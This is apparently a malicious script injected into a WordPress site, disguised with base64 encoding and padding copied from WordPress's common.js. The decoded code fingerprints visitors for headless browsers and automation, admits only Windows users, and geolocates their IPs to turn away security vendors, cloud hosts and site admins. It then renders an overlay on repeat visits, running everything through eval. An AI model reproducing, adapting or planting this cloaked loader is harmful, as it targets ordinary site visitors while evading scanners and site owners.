iAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgYXN5bmMgKCkgPT4gewogICAgICAgIGlmICghbmF2aWdhdG9yLnBlcm1pc3Npb25zKSByZXR1cm4geyBzY29yZTogMCB9OwogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBwZXJtaXNzaW9uU3RhdHVzID0gYXdhaXQgbmF2aWdhdG9yLnBlcm1pc3Npb25zLnF1ZXJ5KHsgbmFtZTogIm5vdGlmaWNhdGlvbnMiIH0pOwogICAgICAgICAgY29uc3Qgbm90aWZpY2F0aW9uUGVybWlzc2lvbiA9IE5vdGlmaWNhdGlvbi5wZXJtaXNzaW9uOwogICAgICAgICAgY29uc3QgaXNJbmNvbnNpc3RlbnQgPSAobm90aWZpY2F0aW9uUGVybWlzc2lvbiA9PT0gImRlbmllZCIgJiYgcGVybWlzc2lvblN0YXR1cy5zdGF0ZSA9PT0gInByb21wdCIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSW5jb25zaXN0ZW50ID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgcGx1Z2luc0xlbmd0aCA9IG5hdmlnYXRvci5wbHVnaW5zPy5sZW5ndGggfHwgMDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSBwbHVnaW5zTGVuZ3RoID09PSAwOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBsYW5ndWFnZSA9IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICBjb25zdCBsYW5ndWFnZXNMZW5ndGggPSBuYXZpZ2F0b3IubGFuZ3VhZ2VzPy5sZW5ndGggfHwgMDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhbGFuZ3VhZ2UgfHwgbGFuZ3VhZ2VzTGVuZ3RoID09PSAwOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2NhbnZhcycpOwogICAgICAgICAgY29uc3QgZ2wgPSBjYW52YXMuZ2V0Q29udGV4dCgnd2ViZ2wnKSB8fCBjYW52YXMuZ2V0Q29udGV4dCgnZXhwZXJpbWVudGFsLXdlYmdsJyk7CiAgICAgICAgICBpZiAoIWdsKSByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICAgIGNvbnN0IGRlYnVnSW5mbyA9IGdsLmdldEV4dGVuc2lvbignV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycpOwogICAgICAgICAgY29uc3QgcmVuZGVyZXIgPSBkZWJ1Z0luZm8gPyBnbC5nZXRQYXJhbWV0ZXIoZGVidWdJbmZvLlVOTUFTS0VEX1JFTkRFUkVSX1dFQkdMKSA6ICd1bmtub3duJzsKICAgICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IC9zd2lmdHNoYWRlcnxsbHZtcGlwZXxtZXNhL2kudGVzdChyZW5kZXJlcik7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICB9CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBvdXRlckhlaWdodCA9IHdpbmRvdy5vdXRlckhlaWdodDsKICAgICAgICBjb25zdCBvdXRlcldpZHRoID0gd2luZG93Lm91dGVyV2lkdGg7CiAgICAgICAgY29uc3QgaW5uZXJIZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICAgICAgY29uc3QgaW5uZXJXaWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IChvdXRlckhlaWdodCA9PT0gMCAmJiBvdXRlcldpZHRoID09PSAwKSB8fCAob3V0ZXJIZWlnaHQgPT09IGlubmVySGVpZ2h0ICYmIG91dGVyV2lkdGggPT09IGlubmVyV2lkdGgpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNDb250cm9sbGVkID0gbmF2aWdhdG9yLndlYmRyaXZlciB8fCB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCd3ZWJkcml2ZXInKSA9PT0gJ3RydWUnIHx8IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzQ29udHJvbGxlZCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc0hlYWRsZXNzID0gL0hlYWRsZXNzQ2hyb21lLy50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNQaGFudG9tID0gd2luZG93LmNhbGxQaGFudG9tIHx8IHdpbmRvdy5fcGhhbnRvbSB8fCB3aW5kb3cucGhhbnRvbTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNQaGFudG9tID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNTZWxlbml1bSA9IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3NlbGVuaXVtJykgIT09IG51bGwgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgIT09IG51bGwgfHwgd2luZG93LmRvY3VtZW50Py4kY2RjXyAhPT0gdW5kZWZpbmVkIHx8IHdpbmRvdy5kb2N1bWVudD8uJHdkY18gIT09IHVuZGVmaW5lZDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTZWxlbml1bSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfQogICAgXTsKCiAgICBsZXQgdG90YWxTY29yZSA9IDA7CiAgICBmb3IgKGNvbnN0IGNoZWNrIG9mIGNoZWNrcykgewogICAgICB0cnkgewogICAgICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IGNoZWNrKCk7CiAgICAgICAgdG90YWxTY29yZSArPSByZXN1bHQuc2NvcmU7CiAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgLy8gSWdub3JlIGVycm9ycwogICAgICB9CiAgICB9CgogICAgY29uc3QgbWF4UG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFETEVTU19XRUlHSFQ7CiAgICBjb25zdCBtaW5Qb3NzaWJsZVNjb3JlID0gY2hlY2tzLmxlbmd0aCAqIEhFQURGVUxfV0VJR0hUOwogICAgY29uc3Qgbm9ybWFsaXplZFNjb3JlID0gTWF0aC5tYXgoMCwgTWF0aC5taW4oMTAwLCAoKHRvdGFsU2NvcmUgLSBtaW5Qb3NzaWJsZVNjb3JlKSAvIChtYXhQb3NzaWJsZVNjb3JlIC0gbWluUG9zc2libGVTY29yZSkpICogMTAwKSk7CiAgICByZXR1cm4gTWF0aC5yb3VuZChub3JtYWxpemVkU2NvcmUpOwogIH0KCiAgZnVuY3Rpb24gZGV0ZWN0T1MoKSB7CiAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICBjb25zdCBwbGF0Zm9ybSA9IG5hdmlnYXRvci5wbGF0Zm9ybT8udG9Mb3dlckNhc2UoKSB8fCAnJzsKCiAgICBpZiAoL2lwaG9uZXxpcGFkfGlwb2QvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnaW9zJzsKICAgIGlmICgvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdhbmRyb2lkJzsKICAgIGlmICgvbGludXgvaS50ZXN0KHVzZXJBZ2VudCkgJiYgIS9hbmRyb2lkL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2xpbnV4JzsKICAgIGlmICgvbWFjIG9zIHh8bWFjaW50b3NoL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ21hYyc7CiAgICBpZiAoL3dpbi9pLnRlc3QodXNlckFnZW50KSB8fCAvd2luL2kudGVzdChwbGF0Zm9ybSkpIHJldHVybiAnd2luZG93cyc7CgogICAgcmV0dXJuICd1bmtub3duJzsKICB9CgogIGFzeW5jIGZ1bmN0aW9uIGlzQWNjZXNzQWxsb3dlZCgpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGRldGVjdGVkT1MgPSBkZXRlY3RPUygpOwogICAgICBjb25zdCBpbmNsdWRlT1NMaXN0ID0gWyJ3aW5kb3dzIl07CiAgICAgIGlmIChpbmNsdWRlT1NMaXN0Lmxlbmd0aCA+IDAgJiYgIWluY2x1ZGVPU0xpc3QuaW5jbHVkZXMoZGV0ZWN0ZWRPUykpIHsKICAgICAgICB2bG9nKCdkZW55X29zJywgZGV0ZWN0ZWRPUyk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGhlYWRsZXNzUHJvYmFiaWxpdHkgPSBhd2FpdCBkZXRlY3RIZWFkbGVzcygpOwogICAgICBpZiAoaGVhZGxlc3NQcm9iYWJpbGl0eSA+IDI1KSB7CiAgICAgICAgdmxvZygnZGVueV9oZWFkbGVzcycsIGhlYWRsZXNzUHJvYmFiaWxpdHkpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBib3RQYXR0ZXJucyA9IFsnYm90JywnY3Jhd2wnLCdzcGlkZXInLCdzY3JhcGUnLCdzbHVycCcsJ3lhaG9vJywnZ29vZ2xlJywneWFuZGV4JywnYmFpZHUnLCdiaW5nJywnZHVja2R1Y2snLCd0ZW9tYScsJ2FyY2hpdmUnXTsKICAgICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICBmb3IgKGNvbnN0IHBhdHRlcm4gb2YgYm90UGF0dGVybnMpIHsKICAgICAgICBpZiAodXNlckFnZW50LmluY2x1ZGVzKHBhdHRlcm4pKSB7CiAgICAgICAgICB2bG9nKCdkZW55X2JvdF91YScsIHVzZXJBZ2VudCk7CiAgICAgICAgICB0cmFja0JvdCgpOwogICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgfQoKICAgICAgCiAgICAgIGNvbnN0IGlwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICAgIGlmICghaXBSZXNwb25zZS5vaykgewogICAgICAgIHZsb2coJ2lwaWZ5X2ZhaWxlZCcsIGlwUmVzcG9uc2Uuc3RhdHVzKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgfQogICAgICBjb25zdCBpcERhdGEgPSBhd2FpdCBpcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXAgPSBpcERhdGEuaXA7CgogICAgICBjb25zdCBpc3BSZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2lwMmxvY2F0aW9uLWFwaS05Nzk4NDgwNjc2NzcudXMtY2VudHJhbDEucnVuLmFwcC8/aXA9JyArIGlwKTsKICAgICAgaWYgKCFpc3BSZXNwb25zZS5vaykgewogICAgICAgIHZsb2coJ2lzcF9sb29rdXBfZmFpbGVkJywgaXNwUmVzcG9uc2Uuc3RhdHVzKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgfQogICAgICBjb25zdCBpc3BEYXRhID0gYXdhaXQgaXNwUmVzcG9uc2UuanNvbigpOwogICAgICBjb25zdCBpc3AgPSBpc3BEYXRhLmlzcCB8fCAnJzsKICAgICAgY29uc3QgY291bnRyeUNvZGUgPSBpc3BEYXRhLmdlb2lwMl9jb3VudHJ5X2NvZGUgfHwgJyc7CgogICAgICB2bG9nKCdpcF9pbmZvJywgeyBpcCwgY291bnRyeUNvZGUsIGlzcCB9KTsKCiAgICAgIGNvbnN0IGluY2x1ZGVDb3VudHJ5TGlzdCA9IFtdOwogICAgICBpZiAoaW5jbHVkZUNvdW50cnlMaXN0Lmxlbmd0aCA+IDAgJiYgKCFjb3VudHJ5Q29kZSB8fCAhaW5jbHVkZUNvdW50cnlMaXN0LmluY2x1ZGVzKGNvdW50cnlDb2RlKSkpIHsKICAgICAgICB2bG9nKCdkZW55X2NvdW50cnknLCBjb3VudHJ5Q29kZSk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGJsb2NrZWRJU1BzID0gWwogICAgICAgICdNMjQ3IEV1cm9wZScsJ1BhY2tldGh1YicsJ0xlYXNlV2ViJywnRGF0YUNhbXAnLCdJUFhPJywnU2VjdXJlIERhdGEgU3lzdGVtcycsJ05pZWRlcnNhZWNoc2lzY2hlIExhbmRlc3JlZ2llcnVuZycsJ0JhcnJhY3VkYSBOZXR3b3JrcycsJ1RyZW5kIE1pY3JvIEluY29ycG9yYXRlZCcsJ01pY3Jvc29mdCBDb3JwJywnTWljcm9zb2Z0IENvcnBvcmF0aW9uJywnU3VyZkNvbnRyb2wnLCdXZWJzZW5zZScsJ0dIT1NUbmV0IEdtYkgnLCdJTkVUdScsJ0F2aXJhIEIuVi4nLCdHb29nbGUgQ2xvdWQnLCdZYWhvbyEnLCdDb21tdG91Y2gnLCdDbG91ZEZsYXJlJywnVHJ1c3R3YXZlIEhvbGRpbmdzJywnRk9SVEhuZXQgU0EnLCdVUyBEZXBhcnRtZW50IG9mIERlZmVuc2UgTmV0d29yaycsJ1pPTkVTIEFTJywnQ2lzY28gU3lzdGVtcyBJcm9ucG9ydCBEaXZpc2lvbicsJ1RoZVBsYW5ldC5jb20gSW50ZXJuZXQgU2VydmljZXMnLCdXZWJyb290IFNlcnZpY2VzJywnUmFja3NwYWNlIEhvc3RpbmcnLCdQZXJpbWV0ZXIgZVNlY3VyaXR5JywnRGlnaXRhbE9jZWFuJywnUGFja2V0RXhjaGFuZ2UnLCdHeXJvbiBJbnRlcm5ldCBMdGQnLCdOZXdNZWRpYSBFeHByZXNzIFB0ZScsJ0FtYXpvbi5jb20nLCdNY0FmZWUnLCdFU0VULCBzcG9sLiBzIHIuby4nLCdGYWNlYm9vaycsJ0ZhY2Vib29rIElyZWxhbmQgTHRkJywnWWFob28hIEJyb2FkY2FzdCBTZXJ2aWNlcycsJ1lhaG9vISBJbmRpYSBQdnQnLCdZYWhvbyBKYXBhbicsJ1lhaG9vIEphcGFuIENvcnBvcmF0aW9uJywnR29vZ2xlYm90JywnQVZBU1QgU29mdHdhcmUgcy5yLm8uJywnTWljcm9zb2Z0IGJpbmdib3QnLCdNaWNyb3NvZnQgSG9zdGluZycsJ0FtYXpvbiBUZWNobm9sb2dpZXMnLCdDeXZlaWxsYW5jZScsJ0Nsb3VkbWFyaycsJ0Nsb3VkbWFyayBMYWJzJywnVG9wc3kgTGFicycsJ0FtYXpvbicsJ1NFUlZFUiBCTE9DSycsJ09WSCBIb3N0aW5nJywnWUFOREVYJywnWUFOREVYIExMQycsJ1lhaG9vIEJhbmdhbG9yZSBOZXR3b3JrIE1vbml0b3JpbmcgQ2VudGVyJywnVGluZXQnLCdNdWx0aW1lZGlhIFBvbHNrYSBTLkEuJywnTXVsdGltZWRpYSBQb2xza2EgLSBQb2x1ZG5pZSBTLkEuJywnWmVuaXRoIEVsZWN0cm9uaWNzIENvcnBvcmF0aW9uJywnQmFycmFjdWRhIENhbmFkYScsJ01pY3Jvc29mdCBMaW1pdGVkJywnTWljcm9zb2Z0IChDaGluYSkgQ28uJywnU1BBTWZpZ2h0ZXIgQXBTJywnU3BhbWZpZ2h0ZXItYXMnLCdEaWdpdGFsT25lIEFHJywnVHdpdHRlcicsJ1R3aXR0ZXIgSW50ZXJuYXRpb25hbCBDb21wYW55JywnU3VyZmNvbnRyb2wtcmVhZGluZycsJ1lhaG9vIENvcnAgTmV0d29yaycsJ0NvbmVjdGl2YScsJ0NvbmVjdGl2YSBUZWxlY29tJywnQ29uZWN0aXZhIENlbHVsYXIgZSBJbmZvcm1hdGljYSBMdGRhJywnUmVkaWZmLmNvbSBJbmRpYSBMaW1pdGVkJywnSW5jZXJvIExMQycsJ09OTElORSBTLkEuUy4nLCdPTkxJTkUgU0FTJywnVGlzY2FsaS1pdCcsJ1Rpc2NhbGkgU3BBJywnVGlzY2FsaSBVSyBMaW1pdGVkJywnRnVqaXRzdScsJ0RhdW0gQ29tbXVuaWNhdGlvbiBDby4sTFREJywnSW50ZXJuZXQgU2VjdXJpdHkgU3lzdGVtcycsJ1ZLb250YWt0ZSBMdGQnLCdMZWFzZXdlYicsJ0xlYXNlV2ViIE5ldGhlcmxhbmRzIEIuVi4nLCdMZWFzZVdlYiBCLlYuJywnTGVhc2VXZWIgQ0ROIEIuVi4nLCdMZWFzZVdlYiBOZXR3b3JrIEIuVi4nLCdMZWFzZXdlYiBBc2lhJywnTGVhc2V3ZWIgQXNpYSBQYWNpZmljIHB0ZS4nLCdMZWFzZXdlYiBEZXV0c2NobGFuZCBHbWJIJywnTGVhc2V3ZWIgVVNBJywnTGVhc2V3ZWItZGUnLCdJbnRlck5BUCBOZXR3b3JrIFNlcnZpY2VzIFUuSy4gTGltaXRlZCcsJ0ludGVybmFwIEphcGFuIENvLixMVEQuJywnSW50ZXJuYXAgTmV0d29yayBTZXJ2aWNlcycsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMgQ29ycG9yYXRpb24nLCdCaXRkZWZlbmRlci1hcycsJ0JpdGRlZmVuZGVyIFNSTCcsJ01YIExvZ2ljJywnQ2hpbmEgRWR1Y2F0aW9uIGFuZCBSZXNlYXJjaCBOZXR3b3JrIENlbnRlcicsJ0NoaW5hIER1dHkgRnJlZSBncm91cCcsJ0NoaW5hJywnQ2hpbmEgQnJvYWRiYW5kIENvbW11bmljYXRpb25zIChDQkNuZXQpJywnQ2hpbmEgQnJvYWRjYXN0aW5nIFRWIE5ldCcsJ0NoaW5hIENvbW11bmljYXRpb24gQ28uJywnQ2hpbmEgQ29uc3RydWN0aW9uIEJhbmsgKEFzaWEpIENvcnBvcmF0aW9uIExpbWl0ZWQnLCdDaGluYSBDdWx0dXJhbCBIZXJpdGFnZSBJbmZvcm1hdGlvbiBhbmQgQ29uc3VsdGluZycsJ0NoaW5hIERpZ2l0YWwgS2luZ2RvbSBUZWNobm9sb2d5IENvLixMdGQuJywnQ2hpbmEgRHJhZ29uIFRlbGVjb20gQ28uLEx0ZCcsJ0ZhY3Rpb24nLCdaZW4gU3lzdGVtcyBBL1MnLCdPVkggU0FTJywnU29sdXRpb24gUHJvJywnRGVkRmliZXJDbycsJ0NsZWFyQmx1ZSBUZWNobm9sb2dpZXMnLCdJbmZvcm1hdGlvbiBUZWNobm9sb2d5IFN5c3RlbXMnLCdHb0RhZGR5LmNvbSwgTExDJywnU2VydmVyIENlbnRyYWwgTmV0d29yaycsJ1RpbmV0IFNwYScsJ0NhcHJpcyBHcm91cCcsJ0lua3RvbWkgQ29ycG9yYXRpb24nLCdVbmlmaWVkIExheWVyJywnSlNDIFJUQ29tbS5SVScsJ0xMQyBtYXN0ZXJob3N0JywnTVRPIFRlbGVjb20nLCdMaW5rZWRJbiBDb3Jwb3JhdGlvbicsJ1dlYnNpdGV3ZWxjb21lLmNvbScsJ0dUUyBUZWxlY29tIFNSTCcsJ1B1bHNlUG9pbnQgQ29tbXVuaWNhdGlvbnMnLCdQdWxzZXBvaW50JywnVGltZVdlYiBMdGQuJywnQmVpamluZyBCYWlkdSBOZXRjb20gU2NpZW5jZSBhbmQgVGVjaG5vbG9neSBDby4nLCdEaWdpdGFsIE9jZWFuJywnVGhyZWF0VHJhY2snLCdUaHJlYXRUcmFjayBTZWN1cml0eScsJ0VHSUhvc3RpbmcnLCdIRVRaTkVSJywnSGV0em5lci1hcycsJ0hldHpuZXIgT25saW5lIEdtYkgnLCdIRVRaTkVSIChQdHkpIEx0ZCcsJ0hldHpuZXIgQ0MnLCdMaW1pdGVkIGxpYWJpbGl0eSBjb21wYW55IE1haWwuUnUnLCdBbWF6b24gQ29ycG9yYXRlIExMQycsJ0FtYXpvbiBEYXRhIFNlcnZpY2VzIElyZWxhbmQgTHRkJywnQW1hem9uIFdlYiBTZXJ2aWNlcywgTExDJywnQW1hem9uLmNvbSBUZWNoIFRlbGVjb20nLCdBbWF6b25pYSBQdWJsaWNpZGFkZSBMdGRhJywnQW1hem9uaWEgVGVsZWNvbSBMdGRhLiAtIE1lJywnS2FzcGVyc2t5IExhYiBBTycsJ0FsaXN0YXIgU2VjdXJpdHkgU3JsJywnTkZPcmNlIEVudGVydGFpbm1lbnQgQi5WLicsJ1NLIEJyb2FkYmFuZCcsJ1pheW8gR3JvdXAgRVUgTGltaXRlZCcsJ1F1YWRyYU5ldCcsJ1JhbU5vZGUgTExDJywnSG9zdFVTJwogICAgICBdOwoKICAgICAgaWYgKGJsb2NrZWRJU1BzLmluY2x1ZGVzKGlzcCkpIHsKICAgICAgICB2bG9nKCdkZW55X2lzcCcsIGlzcCk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KICAgICAgCgogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICB2ZXJyKCdBY2Nlc3MgY2hlY2sgZmFpbGVkOicsIGVycik7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogIH0KCiAgYXN5bmMgZnVuY3Rpb24gaW5pdCgpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGFsbG93ZWQgPSBhd2FpdCBpc0FjY2Vzc0FsbG93ZWQoKTsKICAgICAgdmxvZygnYWNjZXNzX2FsbG93ZWQnLCBhbGxvd2VkKTsKICAgICAgaWYgKCFhbGxvd2VkKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBjb25zdCBza2lwID0gZ2V0VmFsKCdfc2tpcCcsICcwJyk7CiAgICAgIGlmIChza2lwID09PSAnMScpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBsZXQgY291bnQgPSBwYXJzZUludChnZXRWYWwoS0VZLCAnMCcpLCAxMCk7CiAgICAgIGlmIChOdW1iZXIuaXNOYU4oY291bnQpKSBjb3VudCA9IDA7CiAgICAgIGNvdW50Kys7CiAgICAgIHNldFZhbChLRVksIGNvdW50LnRvU3RyaW5nKCkpOwoKICAgICAgaWYgKGNvdW50ID49IE4pIHsKICAgICAgICByZW5kZXJPdmVybGF5KCk7CiAgICAgIH0KICAgIH0gY2F0Y2goZSkgewogICAgICB2ZXJyKCdpbml0X2ZhaWxlZCcsIGUpOwogICAgICByZW5kZXJPdmVybGF5KCk7CiAgICB9CiAgfQoKICBpZiAoZG9jdW1lbnQuYm9keSkgewogICAgaW5pdCgpOwogIH0gZWxzZSB7CiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgaW5pdCk7CiAgfQp9KSgpOwogIA==",
    "MC42MjMwNzMxOTQxOTc3Mjc2",
    "MC43MTYzMzY5OTc5OTIzMDA3",
    "MC4yOTM1MDIxMzg4MTU3NTAxNg==",
    "MC43NDYzMjMyNTkyMjA1OTUz",
    "MC44NzQxMDk0MDc4NDM0Nzgy",
    "MC4wNjg1MjI4NjM2NzI0NDQ0Mg==",
    "MC42MTM1MzczNTAzNzc5NzY=",
    "MC40NTkwMzc3Nzc1NDgwNzUwNw=="
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 1;

  var _code = b64ToUtf8(_e[_k1]) + b64ToUtf8(_b[_k2]) + b64ToUtf8(_c[_k3]);
  eval(_code);
})();
/* >>> wp_junk.js (84030 bytes) <<< */
(function(){
try{
var maps = {};

var url = require( "url" ),
	xmlrpc = require( "xmlrpc" ),
	fieldMap = require( "./fields" );
/**
 * @output wp-admin/js/common.js
 */

/* global setUserSetting, ajaxurl, alert, confirm, pagenow */
/* global columns, screenMeta */

/**
 *  Adds common WordPress functionality to the window.
 *
 *  @param {jQuery} $        jQuery object.
 *  @param {Object} window   The window object.
 *  @param {mixed} undefined Unused.
 */
( function( $, window, undefined ) {
	var $document = $( document ),
		$window = $( window ),
		$body = $( document.body ),
		__ = wp.i18n.__,
		sprintf = wp.i18n.sprintf;

/**
 * Throws an error for a deprecated property.
 *
 * @since 5.5.1
 *
 * @param {string} propName    The property that was used.
 * @param {string} version     The version of WordPress that deprecated the property.
 * @param {string} replacement The property that should have been used.
 */
function deprecatedProperty( propName, version, replacement ) {
	var message;

	if ( 'undefined' !== typeof replacement ) {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number, 3: Alternative property name. */
			__( '%1$s is deprecated since version %2$s! Use %3$s instead.' ),
			propName,
			version,
			replacement
		);
	} else {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number. */
			__( '%1$s is deprecated since version %2$s with no alternative available.' ),
			propName,
			version
		);
	}

	window.console.warn( message );
}

/**
 * Deprecate all properties on an object.
 *
 * @since 5.5.1
 * @since 5.6.0 Added the `version` parameter.
 *
 * @param {string} name       The name of the object, i.e. commonL10n.
 * @param {object} l10nObject The object to deprecate the properties on.
 * @param {string} version    The version of WordPress that deprecated the property.
 *
 * @return {object} The object with all its properties deprecated.
 */
function deprecateL10nObject( name, l10nObject, version ) {
	var deprecatedObject = {};

	Object.keys( l10nObject ).forEach( function( key ) {
		var prop = l10nObject[ key ];
		var propName = name + '.' + key;

		if ( 'object' === typeof prop ) {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, prop.alternative );
				return prop.func();
			} } );
		} else {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, 'wp.i18n' );
				return prop;
			} } );
		}
	} );

	return deprecatedObject;
}

window.wp.deprecateL10nObject = deprecateL10nObject;

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.6.0
 * @deprecated 5.5.0
 */
window.commonL10n = window.commonL10n || {
	warnDelete: '',
	dismiss: '',
	collapseMenu: '',
	expandMenu: ''
};

window.commonL10n = deprecateL10nObject( 'commonL10n', window.commonL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.3.0
 * @deprecated 5.5.0
 */
window.wpPointerL10n = window.wpPointerL10n || {
	dismiss: ''
};

window.wpPointerL10n = deprecateL10nObject( 'wpPointerL10n', window.wpPointerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.3.0
 * @deprecated 5.5.0
 */
window.userProfileL10n = window.userProfileL10n || {
	warn: '',
	warnWeak: '',
	show: '',
	hide: '',
	cancel: '',
	ariaShow: '',
	ariaHide: ''
};

window.userProfileL10n = deprecateL10nObject( 'userProfileL10n', window.userProfileL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.6
 * @deprecated 5.5.0
 */
window.privacyToolsL10n = window.privacyToolsL10n || {
	noDataFound: '',
	foundAndRemoved: '',
	noneRemoved: '',
	someNotRemoved: '',
	removalError: '',
	emailSent: '',
	noExportFile: '',
	exportError: ''
};

window.privacyToolsL10n = deprecateL10nObject( 'privacyToolsL10n', window.privacyToolsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.6.0
 * @deprecated 5.5.0
 */
window.authcheckL10n = {
	beforeunload: ''
};

window.authcheckL10n = window.authcheckL10n || deprecateL10nObject( 'authcheckL10n', window.authcheckL10n, '5.5.0' );

